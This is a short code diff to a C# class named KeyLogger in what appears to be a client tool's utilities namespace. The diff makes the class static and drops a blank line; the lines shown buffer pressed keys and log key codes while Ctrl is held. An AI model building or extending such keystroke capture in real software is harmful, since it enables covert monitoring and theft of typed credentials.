@@ -10,7 +10,7 @@ using System.Globalization;
 
 namespace Squeaky.Client.Utilities
 {
-    class KeyLogger
+    static class KeyLogger
     {
         public static List<Keys> PressedKeys = new List<Keys>();
         private static StringBuilder LogBuffer = new StringBuilder();
@@ -76,7 +76,6 @@ namespace Squeaky.Client.Utilities
 
             if (e.Control) CtrlPressed = true;
             if (CtrlPressed) LogBuffer.Append(e.KeyCode.ToString().ToLower());
-
         }
 
         private static void OnKeyUp(object sender, KeyEventArgs e)
